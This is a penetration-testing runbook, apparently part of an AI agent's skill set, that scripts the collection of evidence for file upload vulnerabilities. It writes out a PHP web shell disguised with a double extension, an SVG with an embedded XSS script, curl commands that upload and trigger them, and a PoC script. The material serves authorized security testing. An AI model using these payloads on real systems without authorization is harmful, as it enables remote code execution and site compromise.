# File Upload Evidence Collection Runbook

## Purpose
Standardized evidence packaging for file upload vulnerabilities.

## Variables
- `$TARGET_URL` — upload endpoint
- `$FILE_URL` — accessible URL of uploaded file
- `$OUTDIR` — output directory
- `$EVIDENCE_DIR` — `$OUTDIR/evidence/file-upload`
- `$UPLOAD_TYPE` — one of: extension-bypass, svg-xss, path-traversal, content-type-bypass

## Step 1 — Initialize Evidence Directory
```bash
EVIDENCE_DIR="$OUTDIR/evidence/file-upload"
mkdir -p "$EVIDENCE_DIR/request" "$EVIDENCE_DIR/response" "$EVIDENCE_DIR/payloads" "$EVIDENCE_DIR/tool-versions"
```

## Step 2 — Capture Tool Versions
```bash
curl --version > "$EVIDENCE_DIR/tool-versions/curl.txt" 2>&1
python3 --version > "$EVIDENCE_DIR/tool-versions/python3.txt" 2>&1
exiftool -ver > "$EVIDENCE_DIR/tool-versions/exiftool.txt" 2>&1
file --version > "$EVIDENCE_DIR/tool-versions/file.txt" 2>&1
```

## Step 3 — Capture Upload Request and Response

### Extension Bypass Evidence
```bash
cat > "$EVIDENCE_DIR/payloads/01-shell.php.jpg" << 'PHPEOF'
<?php system("id"); ?>
PHPEOF

curl -sk -v -F "file=@$EVIDENCE_DIR/payloads/01-shell.php.jpg" -b "$COOKIE_JAR" "$TARGET_URL" > "$EVIDENCE_DIR/request/01-upload-bypass.txt" 2>&1
curl -sk -F "file=@$EVIDENCE_DIR/payloads/01-shell.php.jpg" -b "$COOKIE_JAR" -o "$EVIDENCE_DIR/response/01-upload-response.txt" "$TARGET_URL"

UPLOAD_PATH=$(grep -oE '(/[a-zA-Z0-9/_.-]+\.php\.jpg|https?://[a-zA-Z0-9/_.-]+\.php\.jpg)' "$EVIDENCE_DIR/response/01-upload-response.txt" | head -1)
echo "Uploaded file path: $UPLOAD_PATH" > "$EVIDENCE_DIR/response/01-uploaded-path.txt"
```

### Code Execution Evidence
```bash
curl -sk -v "$UPLOAD_PATH" -o "$EVIDENCE_DIR/response/02-code-execution-response.txt" 2>"$EVIDENCE_DIR/request/02-code-execution-request.txt"
grep -qE 'uid=|gid=' "$EVIDENCE_DIR/response/02-code-execution-response.txt" && echo "CODE EXECUTION CONFIRMED" >> "$EVIDENCE_DIR/response/02-execution-verdict.txt"
cat "$EVIDENCE_DIR/response/02-code-execution-response.txt"
```

### SVG XSS Evidence
```bash
cat > "$EVIDENCE_DIR/payloads/03-xss.svg" << 'SVGEOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    document.write("XSS_CONFIRMED|"+document.domain);
  </script>
</svg>
SVGEOF

curl -sk -v -F "file=@$EVIDENCE_DIR/payloads/03-xss.svg" -b "$COOKIE_JAR" "$TARGET_URL" > "$EVIDENCE_DIR/request/03-svg-upload.txt" 2>&1
curl -sk -F "file=@$EVIDENCE_DIR/payloads/03-xss.svg" -b "$COOKIE_JAR" -o "$EVIDENCE_DIR/response/03-svg-upload-response.txt" "$TARGET_URL"

SVG_URL=$(grep -oE '(https?://[a-zA-Z0-9/_.-]+\.svg)' "$EVIDENCE_DIR/response/03-svg-upload-response.txt" | head -1)
curl -sk -I "$SVG_URL" 2>&1 | grep -i content-type > "$EVIDENCE_DIR/response/03-svg-content-type.txt"
curl -sk "$SVG_URL" -o "$EVIDENCE_DIR/response/03-svg-served.xml"
grep -q 'XSS_CONFIRMED' "$EVIDENCE_DIR/response/03-svg-served.xml" && echo "SVG XSS PAYLOAD INTACT" >> "$EVIDENCE_DIR/response/03-xss-verdict.txt"
```

## Step 4 — Create PoC Script
```bash
cat > "$EVIDENCE_DIR/poc.sh" << POCEOF
#!/bin/bash
cd "\$(dirname "\$0")"
TARGET_URL="\$TARGET_URL"
curl -sk -v -F "file=@payloads/01-shell.php.jpg" "\$TARGET_URL"
echo ""
echo "Then access the uploaded file at the path returned above"
POCEOF
chmod +x "$EVIDENCE_DIR/poc.sh"
```

## Step 5 — Evidence Manifest
```bash
cat > "$EVIDENCE_DIR/manifest.md" << MANIFESTEOF
# File Upload Evidence Manifest
**Target:** $TARGET_URL
**Upload Type:** $UPLOAD_TYPE
**Timestamp:** $(date -u +%Y-%m-%dT%H:%M:%SZ)

## Files
| File | Description |
|---|---|
| payloads/01-shell.php.jpg | Uploaded PHP shell (double extension bypass) |
| request/01-upload-bypass.txt | curl -v of upload request with bypass |
| response/01-upload-response.txt | Server response to upload |
| response/01-uploaded-path.txt | Extracted file path from upload response |
| request/02-code-execution-request.txt | curl -v accessing uploaded file |
| response/02-code-execution-response.txt | Output of code execution (uid=, gid=) |
| response/02-execution-verdict.txt | Confirmation of code execution |
| payloads/03-xss.svg | SVG with embedded JavaScript |
| response/03-svg-served.xml | SVG file as served (with XSS payload) |
| response/03-xss-verdict.txt | Confirmation of XSS payload intact |
| poc.sh | Reproducible PoC script |
| tool-versions/* | Tool versions used |
MANIFESTEOF
echo "Manifest written to $EVIDENCE_DIR/manifest.md"
```

## Step 6 — Validate and Leak Check
```bash
[ -s "$EVIDENCE_DIR/payloads/01-shell.php.jpg" ] && echo "OK: shell payload" || echo "MISSING: shell payload"
[ -s "$EVIDENCE_DIR/response/02-code-execution-response.txt" ] && echo "OK: code execution evidence" || echo "MISSING: code execution evidence"
[ -s "$EVIDENCE_DIR/poc.sh" ] && echo "OK: PoC script" || echo "MISSING: PoC script"
echo "EVIDENCE PACKAGE READY"

gitleaks detect --source "$EVIDENCE_DIR" --no-git -v 2>&1 | tee "$EVIDENCE_DIR/leak-check.txt"
```

## Output Directory Structure
```
$OUTDIR/evidence/file-upload/
├── manifest.md
├── poc.sh
├── payloads/
│   ├── 01-shell.php.jpg
│   └── 03-xss.svg
├── request/
│   ├── 01-upload-bypass.txt
│   ├── 02-code-execution-request.txt
│   └── 03-svg-upload.txt
├── response/
│   ├── 01-upload-response.txt
│   ├── 01-uploaded-path.txt
│   ├── 02-code-execution-response.txt
│   ├── 02-execution-verdict.txt
│   ├── 03-svg-upload-response.txt
│   ├── 03-svg-content-type.txt
│   ├── 03-svg-served.xml
│   └── 03-xss-verdict.txt
└── tool-versions/
    ├── curl.txt
    ├── python3.txt
    ├── exiftool.txt
    └── file.txt
```

## Next Routing
- Evidence complete -> hand off to `.claude/skills/reporting/SKILL.md`
